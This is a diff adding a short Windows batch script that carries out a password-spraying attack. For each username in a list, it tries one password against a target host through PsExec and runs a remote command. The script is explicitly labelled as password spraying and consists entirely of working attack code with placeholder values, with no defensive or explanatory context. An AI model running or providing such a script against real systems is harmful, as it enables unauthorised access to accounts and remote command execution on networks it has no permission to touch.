@@ -1,0 +1,29 @@
+@echo off
+setlocal enabledelayedexpansion
+
+REM Define the target host
+set TARGET_HOST=target-hostname-or-ip
+
+REM Define the path to PsExec
+set PSEXECPATH="C:\path\to\PsExec.exe"
+
+REM Define a list of usernames (comma separated or one per line)
+set USERNAMES=user1 user2 user3 user4
+
+REM Define the password to test
+set PASSWORD=yourpasswordhere
+
+REM Loop over each username
+for %%u in (%USERNAMES%) do (
+    echo Testing password for %%u on %TARGET_HOST%
+
+    REM Run PsExec to test password
+    %PSEXECPATH% \\%TARGET_HOST% -u %%u -p %PASSWORD% cmd /c "echo Password for %%u is being tested"
+
+    REM Wait a bit before testing the next user (optional)
+    timeout /t 3
+)
+
+endlocal
+echo Finished testing password spraying.
+pause
